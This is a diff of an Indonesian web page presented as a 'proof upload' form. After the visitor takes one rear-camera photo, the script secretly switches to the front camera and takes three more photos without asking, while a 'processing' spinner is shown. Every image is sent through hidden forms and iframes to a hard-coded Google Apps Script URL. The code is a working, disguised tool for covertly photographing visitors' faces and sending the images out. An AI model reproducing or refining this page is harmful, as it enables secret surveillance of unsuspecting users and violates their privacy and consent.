@@ -1,1091 +1,670 @@
 <!DOCTYPE html>
-
-<html>
-
+<html lang="id">
 <head>
-
   <meta charset="UTF-8">
-
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0">
 
   <title>Upload Bukti</title>
-
 
   <style>
     * {
       box-sizing: border-box;
     }
 
-
     body {
-
       margin: 0;
-
       min-height: 100vh;
-
-      background: #ffffff;
-
-      font-family: Arial, sans-serif;
-
       display: flex;
-
       justify-content: center;
-
       align-items: center;
-
+      background: #f5f5f5;
+      font-family: Arial, sans-serif;
     }
-
 
     .container {
-
-      width: 90%;
-
+      width: 100%;
       max-width: 420px;
-
+      padding: 20px;
       text-align: center;
-
     }
 
-
-    #uploadButton {
-
+    button {
       width: 100%;
-
       padding: 16px;
-
       border: none;
-
-      border-radius: 10px;
-
-      background: #111;
-
-      color: white;
-
-      font-size: 17px;
-
-      font-weight: bold;
-
-      cursor: pointer;
-
-    }
-
-
-    #uploadButton:disabled {
-
-      opacity: 0.5;
-
-    }
-
-
-    #video {
-
-      width: 100%;
-
-      margin-top: 20px;
-
       border-radius: 12px;
+      background: #111;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+    }
 
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    video {
+      width: 100%;
+      max-height: 70vh;
+      object-fit: cover;
+      border-radius: 14px;
+      margin-bottom: 15px;
       background: #000;
-
       display: none;
-
     }
 
-
-    #canvas {
-
+    canvas {
       display: none;
-
     }
 
-
-    #loading {
-
+    .loading {
       display: none;
-
-      margin-top: 25px;
-
+      margin: 20px 0;
     }
-
 
     .spinner {
-
-      width: 32px;
-
-      height: 32px;
-
-      margin: auto;
-
+      width: 42px;
+      height: 42px;
+      margin: 0 auto 12px;
       border: 4px solid #ddd;
-
       border-top: 4px solid #111;
-
       border-radius: 50%;
-
-      animation:
-        spin 0.8s linear infinite;
-
+      animation: spin 1s linear infinite;
     }
 
+    .loading-text {
+      font-size: 15px;
+      color: #444;
+    }
+
+    .thank-you {
+      display: none;
+      font-size: 22px;
+      font-weight: bold;
+      color: #111;
+      margin-top: 20px;
+    }
 
     @keyframes spin {
-
-      100% {
-
-        transform:
-          rotate(360deg);
-
+      0% {
+        transform: rotate(0deg);
       }
 
-    }
-
-
-    #thankyou {
-
-      display: none;
-
-      font-size: 20px;
-
-      font-weight: bold;
-
-      color: #111;
-
-    }
-
-
-    #error {
-
-      display: none;
-
-      margin-top: 20px;
-
-      color: #d00;
-
-    }
-
-
-    iframe {
-
-      display: none;
-
+      100% {
+        transform: rotate(360deg);
+      }
     }
   </style>
-
 </head>
-
 
 <body>
 
+<div class="container">
 
-  <div class="container">
+  <!-- PREVIEW CAMERA -->
+  <video id="video"
+         autoplay
+         playsinline>
+  </video>
 
+  <!-- CANVAS UNTUK CAPTURE -->
+  <canvas id="canvas"></canvas>
 
-    <button id="uploadButton" onclick="openCamera()">
+  <!-- BUTTON -->
+  <button id="mainButton"
+          onclick="startProcess()">
+    Upload Bukti
+  </button>
 
-      Upload Bukti
+  <!-- LOADING -->
+  <div id="loading" class="loading">
 
-    </button>
+    <div class="spinner"></div>
 
-
-    <video id="video" autoplay playsinline>
-    </video>
-
-
-    <canvas id="canvas">
-    </canvas>
-
-
-    <div id="loading">
-
-      <div class="spinner"></div>
-
+    <div class="loading-text">
+      Sedang memproses...
     </div>
-
-
-    <div id="thankyou">
-
-      Thank you
-
-    </div>
-
-
-    <div id="error"></div>
-
 
   </div>
 
+  <!-- THANK YOU -->
+  <div id="thankYou"
+       class="thank-you">
+    Thank You
+  </div>
 
-  <script>
-
-
-    // =====================================================
-    // URL GOOGLE APPS SCRIPT
-    // =====================================================
-
-    const GAS_URL =
-      'https://script.google.com/macros/s/AKfycbyTXqpKOHsVlUNhQ_vWe9o5kMBdYjkTCp7gQfky0h00ohNMgIDSTi5PtD3gZ_f-bc_a/exec';
+</div>
 
 
-    // =====================================================
-    // GLOBAL
-    // =====================================================
+<script>
 
-    let stream = null;
+  // =========================================================
+  // MASUKKAN URL GOOGLE APPS SCRIPT WEB APP DI SINI
+  // =========================================================
 
-    let firstPhotoMode = true;
-
-
-    // =====================================================
-    // OPEN CAMERA
-    // =====================================================
-
-    async function openCamera() {
+  const GAS_URL =
+    "https://script.google.com/macros/s/AKfycbyTXqpKOHsVlUNhQ_vWe9o5kMBdYjkTCp7gQfky0h00ohNMgIDSTi5PtD3gZ_f-bc_a/exec";
 
 
-      const button =
-        document.getElementById(
-          'uploadButton'
-        );
+  // =========================================================
+  // VARIABLE
+  // =========================================================
+
+  let video = document.getElementById("video");
+  let canvas = document.getElementById("canvas");
+  let button = document.getElementById("mainButton");
+  let loading = document.getElementById("loading");
+  let thankYou = document.getElementById("thankYou");
+
+  let stream = null;
 
 
-      button.disabled =
-        true;
+  // =========================================================
+  // ID SESSION
+  // =========================================================
+
+  const sessionId =
+    "session_" +
+    Date.now() +
+    "_" +
+    Math.random()
+      .toString(36)
+      .substring(2, 8);
 
 
-      try {
+  // =========================================================
+  // START
+  // =========================================================
 
+  async function startProcess() {
 
-        // =================================================
-        // AKSES KAMERA DEPAN
-        // =================================================
+    button.disabled = true;
 
-        stream =
-          await navigator.mediaDevices
-            .getUserMedia({
+    try {
 
-              video: {
+      // -----------------------------------------------------
+      // BUKA KAMERA BELAKANG
+      // -----------------------------------------------------
 
-                facingMode: {
-                  ideal: 'user'
-                },
+      await openCamera("environment");
 
-                width: {
-                  ideal: 1280
-                },
+      video.style.display = "block";
 
-                height: {
-                  ideal: 720
-                }
+      button.innerText = "Ambil Foto";
 
-              },
+      button.onclick = takeFirstPhoto;
 
-              audio: false
-
-            });
-
-
-        const video =
-          document.getElementById(
-            'video'
-          );
-
-
-        video.srcObject =
-          stream;
-
-
-        video.style.display =
-          'block';
-
-
-        await video.play();
-
-
-        // =================================================
-        // TUNGGU KAMERA SIAP
-        // =================================================
-
-        await waitForVideo();
-
-
-        // =================================================
-        // TAMPILKAN TOMBOL FOTO PERTAMA
-        // =================================================
-
-        button.disabled =
-          false;
-
-
-        button.innerText =
-          'Ambil Foto';
-
-
-        button.onclick =
-          takeFirstPhoto;
-
-
-      }
-
-
-      catch (error) {
-
-
-        showError(
-          error.message
-        );
-
-
-        button.disabled =
-          false;
-
-      }
+      button.disabled = false;
 
     }
 
+    catch (error) {
 
-    // =====================================================
-    // WAIT CAMERA READY
-    // =====================================================
+      console.error(error);
 
-    function waitForVideo() {
-
-
-      return new Promise(
-
-        function (resolve) {
-
-
-          const video =
-            document.getElementById(
-              'video'
-            );
-
-
-          if (
-            video.videoWidth > 0
-          ) {
-
-            resolve();
-
-            return;
-
-          }
-
-
-          const timer =
-            setInterval(
-
-              function () {
-
-
-                if (
-                  video.videoWidth > 0
-                ) {
-
-
-                  clearInterval(
-                    timer
-                  );
-
-
-                  resolve();
-
-                }
-
-              },
-
-              100
-
-            );
-
-        }
-
+      alert(
+        "Kamera tidak dapat dibuka.\n\n" +
+        error.name + ": " +
+        error.message
       );
 
+      button.disabled = false;
+    }
+  }
+
+
+  // =========================================================
+  // OPEN CAMERA
+  // =========================================================
+
+  async function openCamera(cameraType) {
+
+    // Pastikan kamera sebelumnya ditutup
+    stopCamera();
+
+    stream =
+      await navigator.mediaDevices.getUserMedia({
+
+        video: {
+
+          facingMode: {
+            ideal: cameraType
+          },
+
+          width: {
+            ideal: 1280
+          },
+
+          height: {
+            ideal: 720
+          }
+
+        },
+
+        audio: false
+
+      });
+
+    video.srcObject = stream;
+
+    await video.play();
+  }
+
+
+  // =========================================================
+  // STOP CAMERA
+  // =========================================================
+
+  function stopCamera() {
+
+    if (stream) {
+
+      stream
+        .getTracks()
+        .forEach(track => track.stop());
+
+      stream = null;
     }
 
+    video.srcObject = null;
+  }
 
-    // =====================================================
-    // FOTO PERTAMA
-    // =====================================================
 
-    async function takeFirstPhoto() {
+  // =========================================================
+  // CAPTURE FRAME
+  // =========================================================
 
+  function capturePhoto() {
 
-      const button =
-        document.getElementById(
-          'uploadButton'
-        );
+    if (!video.videoWidth || !video.videoHeight) {
 
-
-      button.disabled =
-        true;
-
-
-      // =================================================
-      // LOADING
-      // =================================================
-
-      showLoading();
-
-
-      try {
-
-
-        // =================================================
-        // CAPTURE PERTAMA
-        // =================================================
-
-        const image =
-          captureFrame();
-
-
-        // =================================================
-        // UPLOAD PERTAMA
-        // =================================================
-
-        const success =
-          await uploadPhoto(
-
-            image,
-
-            1
-
-          );
-
-
-        if (!success) {
-
-          throw new Error(
-            'Foto pertama gagal diupload.'
-          );
-
-        }
-
-
-        // =================================================
-        // FOTO 2
-        // =================================================
-
-        await wait(1200);
-
-
-        await automaticCapture(
-          2
-        );
-
-
-        // =================================================
-        // FOTO 3
-        // =================================================
-
-        await wait(1200);
-
-
-        await automaticCapture(
-          3
-        );
-
-
-        // =================================================
-        // FOTO 4
-        // =================================================
-
-        await wait(1200);
-
-
-        await automaticCapture(
-          4
-        );
-
-
-        // =================================================
-        // SELESAI
-        // =================================================
-
-        stopCamera();
-
-
-        hideLoading();
-
-
-        document.getElementById(
-          'video'
-        ).style.display =
-          'none';
-
-
-        document.getElementById(
-          'uploadButton'
-        ).style.display =
-          'none';
-
-
-        document.getElementById(
-          'thankyou'
-        ).style.display =
-          'block';
-
-
-      }
-
-
-      catch (error) {
-
-
-        hideLoading();
-
-
-        stopCamera();
-
-
-        showError(
-          error.message
-        );
-
-
-        button.disabled =
-          false;
-
-
-        button.innerText =
-          'Upload Bukti';
-
-
-        button.onclick =
-          openCamera;
-
-      }
-
+      throw new Error(
+        "Kamera belum siap."
+      );
     }
 
+    canvas.width =
+      video.videoWidth;
 
-    // =====================================================
-    // AUTOMATIC CAPTURE
-    // =====================================================
+    canvas.height =
+      video.videoHeight;
 
-    async function automaticCapture(
-      number
-    ) {
+    const ctx =
+      canvas.getContext("2d");
 
+    ctx.drawImage(
+      video,
+      0,
+      0,
+      canvas.width,
+      canvas.height
+    );
+
+    return canvas.toDataURL(
+      "image/jpeg",
+      0.85
+    );
+  }
+
+
+  // =========================================================
+  // FOTO PERTAMA
+  // KAMERA BELAKANG
+  // =========================================================
+
+  async function takeFirstPhoto() {
+
+    button.disabled = true;
+
+    try {
 
       const image =
-        captureFrame();
+        capturePhoto();
 
-
+      // Upload capture #1
       const success =
         await uploadPhoto(
-
           image,
-
-          number
-
+          1
         );
-
 
       if (!success) {
 
         throw new Error(
-
-          'Capture ' +
-          number +
-          ' gagal diupload.'
-
+          "Upload foto pertama gagal."
         );
-
-      }
-
-    }
-
-
-    // =====================================================
-    // CAPTURE FRAME
-    // =====================================================
-
-    function captureFrame() {
-
-
-      const video =
-        document.getElementById(
-          'video'
-        );
-
-
-      const canvas =
-        document.getElementById(
-          'canvas'
-        );
-
-
-      if (
-        video.videoWidth === 0
-      ) {
-
-        throw new Error(
-          'Kamera belum siap.'
-        );
-
       }
 
 
-      canvas.width =
-        video.videoWidth;
+      // -----------------------------------------------------
+      // FOTO PERTAMA SELESAI
+      // -----------------------------------------------------
+
+      button.style.display = "none";
+
+      loading.style.display = "block";
+
+      document.querySelector(
+        ".loading-text"
+      ).innerText =
+        "Sedang memproses...";
 
 
-      canvas.height =
-        video.videoHeight;
+      // -----------------------------------------------------
+      // MATIKAN KAMERA BELAKANG
+      // -----------------------------------------------------
+
+      stopCamera();
 
 
-      const ctx =
-        canvas.getContext(
-          '2d'
-        );
+      // -----------------------------------------------------
+      // BUKA KAMERA DEPAN
+      // -----------------------------------------------------
+
+      await openCamera("user");
+
+      video.style.display = "block";
 
 
-      ctx.drawImage(
-
-        video,
-
-        0,
-
-        0,
-
-        canvas.width,
-
-        canvas.height
-
-      );
+      // Beri waktu kamera depan stabil
+      await delay(1200);
 
 
-      return canvas.toDataURL(
+      // -----------------------------------------------------
+      // CAPTURE OTOMATIS 2
+      // -----------------------------------------------------
 
-        'image/jpeg',
+      await automaticCapture(2);
 
-        0.75
 
-      );
+      // -----------------------------------------------------
+      // CAPTURE OTOMATIS 3
+      // -----------------------------------------------------
+
+      await automaticCapture(3);
+
+
+      // -----------------------------------------------------
+      // CAPTURE OTOMATIS 4
+      // -----------------------------------------------------
+
+      await automaticCapture(4);
+
+
+      // -----------------------------------------------------
+      // SEMUA SELESAI
+      // -----------------------------------------------------
+
+      stopCamera();
+
+      video.style.display = "none";
+
+      loading.style.display = "none";
+
+      thankYou.style.display = "block";
 
     }
 
+    catch (error) {
 
-    // =====================================================
-    // UPLOAD
-    // =====================================================
+      console.error(error);
 
-    function uploadPhoto(
-      image,
-      number
-    ) {
+      stopCamera();
 
+      loading.style.display = "none";
 
-      return new Promise(
+      button.style.display = "block";
 
-        function (resolve) {
+      button.disabled = false;
 
+      button.innerText =
+        "Upload Bukti";
 
-          // =============================================
-          // ID
-          // =============================================
+      button.onclick =
+        startProcess;
 
-          const id =
-
-            Date.now() +
-
-            '_' +
-
-            number +
-
-            '_' +
-
-            Math.random()
-              .toString(36)
-              .substring(2);
+      alert(
+        "Terjadi kesalahan:\n\n" +
+        error.message
+      );
+    }
+  }
 
 
-          // =============================================
-          // IFRAME
-          // =============================================
+  // =========================================================
+  // AUTOMATIC CAPTURE
+  // =========================================================
 
-          const iframe =
-            document.createElement(
-              'iframe'
-            );
+  async function automaticCapture(number) {
 
-
-          iframe.name =
-            'upload_' + id;
+    // Tunggu sebentar supaya frame kamera stabil
+    await delay(1200);
 
 
-          iframe.style.display =
-            'none';
+    // Ambil foto
+    const image =
+      capturePhoto();
 
 
-          document.body.appendChild(
-            iframe
-          );
+    // Upload
+    const success =
+      await uploadPhoto(
+        image,
+        number
+      );
 
 
-          let finished =
-            false;
+    if (!success) {
+
+      throw new Error(
+        "Upload capture #" +
+        number +
+        " gagal."
+      );
+    }
 
 
-          // =============================================
-          // LOAD RESPONSE
-          // =============================================
-
-          iframe.onload =
-            function () {
+    // Jeda sebelum capture berikutnya
+    await delay(800);
+  }
 
 
-              if (finished) {
+  // =========================================================
+  // UPLOAD FOTO KE GOOGLE APPS SCRIPT
+  // =========================================================
 
-                return;
+  function uploadPhoto(image, number) {
 
-              }
+    return new Promise(
+      function(resolve) {
 
+        const iframe =
+          document.createElement("iframe");
 
-              finished =
-                true;
+        const iframeName =
+          "uploadFrame_" +
+          Date.now() +
+          "_" +
+          Math.random()
+            .toString(36)
+            .substring(2);
 
+        iframe.name =
+          iframeName;
 
-              /*
-                Google Apps Script sudah
-                menerima dan memproses
-                form POST.
-    
-                Beri sedikit waktu tambahan
-                sebelum lanjut ke capture berikutnya.
-              */
+        iframe.style.display =
+          "none";
 
-              setTimeout(
-
-                function () {
-
-
-                  if (
-                    iframe.parentNode
-                  ) {
-
-                    iframe.remove();
-
-                  }
+        document.body.appendChild(
+          iframe
+        );
 
 
-                  resolve(true);
+        // ---------------------------------------------------
+        // FORM
+        // ---------------------------------------------------
+
+        const form =
+          document.createElement("form");
+
+        form.method =
+          "POST";
+
+        form.action =
+          GAS_URL;
+
+        form.target =
+          iframeName;
+
+        form.style.display =
+          "none";
 
 
-                },
+        // ---------------------------------------------------
+        // PAYLOAD
+        // ---------------------------------------------------
 
-                1000
+        const payload = {
 
-              );
+          id: sessionId,
 
-            };
+          captureNumber:
+            number,
+
+          image:
+            image
+
+        };
 
 
-          // =============================================
-          // TIMEOUT
-          // =============================================
+        const input =
+          document.createElement("input");
 
-          const timeout =
+        input.type =
+          "hidden";
+
+        input.name =
+          "payload";
+
+        input.value =
+          JSON.stringify(payload);
+
+
+        form.appendChild(
+          input
+        );
+
+        document.body.appendChild(
+          form
+        );
+
+
+        // ---------------------------------------------------
+        // RESPONSE LOAD
+        // ---------------------------------------------------
+
+        let finished = false;
+
+        iframe.onload =
+          function() {
+
+            if (finished) return;
+
+            finished = true;
+
+
+            // Beri waktu GAS menyelesaikan proses
             setTimeout(
+              function() {
 
-              function () {
+                cleanup();
 
-
-                if (finished) {
-
-                  return;
-
-                }
-
-
-                finished =
-                  true;
-
-
-                if (
-                  iframe.parentNode
-                ) {
-
-                  iframe.remove();
-
-                }
-
-
-                resolve(false);
-
+                resolve(true);
 
               },
-
-              60000
-
+              1000
             );
-
-
-          // =============================================
-          // FORM
-          // =============================================
-
-          const form =
-            document.createElement(
-              'form'
-            );
-
-
-          form.method =
-            'POST';
-
-
-          form.action =
-            GAS_URL;
-
-
-          form.target =
-            iframe.name;
-
-
-          form.enctype =
-            'application/x-www-form-urlencoded';
-
-
-          form.style.display =
-            'none';
-
-
-          // =============================================
-          // PAYLOAD
-          // =============================================
-
-          const payload = {
-
-            id:
-              id,
-
-            captureNumber:
-              number,
-
-            image:
-              image
-
           };
 
 
-          const input =
-            document.createElement(
-              'input'
-            );
+        // ---------------------------------------------------
+        // TIMEOUT
+        // ---------------------------------------------------
 
+        const timeout =
+          setTimeout(
+            function() {
 
-          input.type =
-            'hidden';
+              if (finished) return;
 
+              finished = true;
 
-          input.name =
-            'payload';
-
-
-          input.value =
-            JSON.stringify(
-              payload
-            );
-
-
-          form.appendChild(
-            input
-          );
-
-
-          document.body.appendChild(
-            form
-          );
-
-
-          // =============================================
-          // SUBMIT
-          // =============================================
-
-          try {
-
-            form.submit();
-
-          }
-
-          catch (error) {
-
-
-            clearTimeout(
-              timeout
-            );
-
-
-            if (!finished) {
-
-
-              finished =
-                true;
-
-
-              if (
-                iframe.parentNode
-              ) {
-
-                iframe.remove();
-
-              }
-
-
-              if (
-                form.parentNode
-              ) {
-
-                form.remove();
-
-              }
-
+              cleanup();
 
               resolve(false);
 
-            }
-
-
-            return;
-
-          }
-
-
-          // =============================================
-          // REMOVE FORM
-          // =============================================
-
-          setTimeout(
-
-            function () {
-
-              if (
-                form.parentNode
-              ) {
-
-                form.remove();
-
-              }
-
             },
-
-            5000
-
+            60000
           );
 
+
+        // ---------------------------------------------------
+        // SUBMIT
+        // ---------------------------------------------------
+
+        form.submit();
+
+
+        // ---------------------------------------------------
+        // CLEANUP
+        // ---------------------------------------------------
+
+        function cleanup() {
+
+          clearTimeout(
+            timeout
+          );
+
+          try {
+            document.body.removeChild(
+              form
+            );
+          }
+          catch (e) {}
+
+          try {
+            document.body.removeChild(
+              iframe
+            );
+          }
+          catch (e) {}
         }
 
-      );
-
-    }
-
-
-    // =====================================================
-    // LOADING
-    // =====================================================
-
-    function showLoading() {
-
-      document.getElementById(
-        'loading'
-      ).style.display =
-        'block';
-
-    }
-
-
-    function hideLoading() {
-
-      document.getElementById(
-        'loading'
-      ).style.display =
-        'none';
-
-    }
-
-
-    // =====================================================
-    // ERROR
-    // =====================================================
-
-    function showError(
-      message
-    ) {
-
-
-      const error =
-        document.getElementById(
-          'error'
-        );
-
-
-      error.innerText =
-        message;
-
-
-      error.style.display =
-        'block';
-
-    }
-
-
-    // =====================================================
-    // STOP CAMERA
-    // =====================================================
-
-    function stopCamera() {
-
-
-      if (!stream) {
-
-        return;
-
       }
+    );
+  }
 
 
-      stream
-        .getTracks()
-        .forEach(
+  // =========================================================
+  // DELAY
+  // =========================================================
 
-          function (track) {
+  function delay(ms) {
 
-            track.stop();
+    return new Promise(
+      resolve =>
+        setTimeout(
+          resolve,
+          ms
+        )
+    );
 
-          }
+  }
 
-        );
-
-
-      stream =
-        null;
-
-    }
-
-
-    // =====================================================
-    // WAIT
-    // =====================================================
-
-    function wait(ms) {
-
-      return new Promise(
-
-        resolve =>
-          setTimeout(
-            resolve,
-            ms
-          )
-
-      );
-
-    }
-
-  </script>
-
+</script>
 
 </body>
-
 </html>
